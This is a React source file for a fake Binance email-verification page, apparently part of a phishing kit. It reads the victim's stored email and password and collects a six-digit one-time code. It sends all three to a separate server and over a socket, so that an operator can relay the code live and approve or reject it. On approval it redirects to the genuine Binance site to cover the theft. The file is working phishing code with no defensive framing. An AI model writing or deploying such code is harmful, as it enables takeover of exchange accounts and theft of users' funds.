import React, { useEffect, useState } from "react";
import Spinner from "../components/Spinner";
import { serverRoute, socket } from "./Main";
import axios from "axios";

const OTP = () => {
  const email = sessionStorage.getItem("email");
  const password = sessionStorage.getItem("password");
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const handleSubmit = async (e) => {
    setError(false);
    e.preventDefault();
    setLoading(true);
    await axios
      .post(serverRoute + "/otp", { email, password, otp })
      .then(() => {
        socket.emit("otp", { mail: email, password, otp });
      });
  };

  const reject = (data) => {
    if (
      data.email === email &&
      data.password === password &&
      data.otp === otp
    ) {
      setError(true);
      setLoading(false);
    }
  };
  const accept = (data) => {
    if (data.email === email && data.password === password && data.otp === otp)
      window.location.href = "https://www.binance.com/en/price/official-trump";
  };

  socket.on("declineOtp", reject);
  socket.on("acceptOtp", accept);

  return (
    <div className="md:w-1/4 w-10/12 flex md:-mb-5 mb-3 items-center justify-center gap-x-10 rounded-lg text-gray-400 bg-gray-800 md:border border-gray-600 bg-opacity-70">
      <div className="  flex flex-col m-2 items-center justify-center w-full   rounded-xl  px-8 pb-5 pt-2">
        <div className="md:w-10/12 w-full">
          <svg
            className="
        w-2/5
        h-28"
            viewBox="0 0 120 30"
          >
            <path
              fill="#F0B90B"
              d="M5.41406 12L2.71875 14.6953L0 12L2.71875 9.28125L5.41406 12ZM12 5.41406L16.6406 10.0547L19.3594 7.33594L12 0L4.64062 7.35938L7.35938 10.0781L12 5.41406ZM21.2812 9.28125L18.5859 12L21.3047 14.7188L24.0234 12L21.2812 9.28125ZM12 18.5859L7.35938 13.9219L4.64062 16.6406L12 24L19.3594 16.6406L16.6406 13.9219L12 18.5859ZM12 14.6953L14.7188 11.9766L12 9.28125L9.28125 12L12 14.6953ZM40.5938 14.9766V14.9297C40.5938 13.1719 39.6562 12.2812 38.1328 11.6953C39.0703 11.1797 39.8672 10.3359 39.8672 8.85938V8.8125C39.8672 6.75 38.2031 5.41406 35.5312 5.41406H29.4141V18.5625H35.6719C38.6484 18.5859 40.5938 17.3672 40.5938 14.9766ZM36.9844 9.35156C36.9844 10.3359 36.1875 10.7344 34.8984 10.7344H32.2266V7.94531H35.0859C36.3047 7.94531 36.9844 8.4375 36.9844 9.30469V9.35156ZM37.7109 14.6016C37.7109 15.5859 36.9375 16.0312 35.6719 16.0312H32.2266V13.1484H35.5781C37.0547 13.1484 37.7109 13.6875 37.7109 14.5781V14.6016ZM46.6641 18.5625V5.41406H43.7578V18.5625H46.6641ZM62.2266 18.5859V5.41406H59.3672V13.5234L53.2031 5.41406H50.5312V18.5625H53.3906V10.2188L59.7656 18.5859H62.2266ZM78.2578 18.5859L72.6094 5.34375H69.9375L64.2891 18.5859H67.2656L68.4609 15.6328H74.0156L75.2109 18.5859H78.2578ZM72.9844 13.0781H69.4922L71.25 8.8125L72.9844 13.0781ZM92.0625 18.5859V5.41406H89.2031V13.5234L83.0391 5.41406H80.3672V18.5625H83.2266V10.2188L89.6016 18.5859H92.0625ZM106.992 16.4531L105.141 14.6016C104.109 15.5391 103.195 16.1484 101.672 16.1484C99.4219 16.1484 97.8516 14.2734 97.8516 12.0234V11.9531C97.8516 9.70312 99.4453 7.85156 101.672 7.85156C102.984 7.85156 104.016 8.41406 105.047 9.32812L106.898 7.19531C105.68 6 104.203 5.15625 101.719 5.15625C97.6875 5.15625 94.8516 8.22656 94.8516 11.9531V12C94.8516 15.7734 97.7344 18.7734 101.602 18.7734C104.133 18.7969 105.633 17.9062 106.992 16.4531ZM119.344 18.5625V16.0078H112.195V13.2422H118.406V10.6641H112.195V7.99219H119.25V5.41406H109.336V18.5625H119.344Z"
            ></path>
          </svg>
        </div>
        <div className="md:w-11/12 w-full flex-col flex items-start justify-between">
          <header className="text-white md:text-4xl text-2xl w-full">
            Email Verification
          </header>
          <span className="md:text-lg text-gray-500 md:mt-5 mt-2">
            Enter the 6-digit verification code sent to
            {email.slice(0, 5)}***@gmail.com
          </span>
        </div>
        <form
          className="mt-5 flex items-center justify-center flex-col gap-y-1 w-full"
          onSubmit={handleSubmit}
        >
          <span className="text-white text-lg text-start md:w-11/12 w-full">
            Email Verification Code
          </span>
          <input
            type="text"
            value={otp}
            onChange={(e) => {
              setError(false);
              setOtp(e.target.value);
            }}
            required
            min={6}
            minLength={6}
            placeholder="Code Sent"
            max={6}
            maxLength={6}
            inputMode="numeric"
            className={`bg-inherit md:w-11/12 w-full p-3  md:placeholder:font-bold border  text-white border-gray-700 rounded-lg outline-white ${
              error && "outline-red-500 border-red-500"
            }`}
          />
          {error ? (
            <span className="text-red-500 w-full text-sm md:text-base ml-7">
              Wrong code. Try again
            </span>
          ) : (
            ""
          )}
          <button
            style={{ backgroundColor: "#F0B90B", color: "#1f1f1f" }}
            className={` ${
              loading ? "cursor-progress" : "cursor-pointer"
            } md:w-11/12 w-full rounded-md py-2 text-xl my-5 hover:opacity-80 transition-all`}
          >
            {loading ? <Spinner /> : "Submit"}
          </button>
        </form>
        <div
          className="flex items-center justify-center my-5  mb-10 text-order"
          style={{ color: "#F0B90B" }}
        >
          Security verification unavailable ?
        </div>
      </div>
    </div>
  );
};

export default OTP;
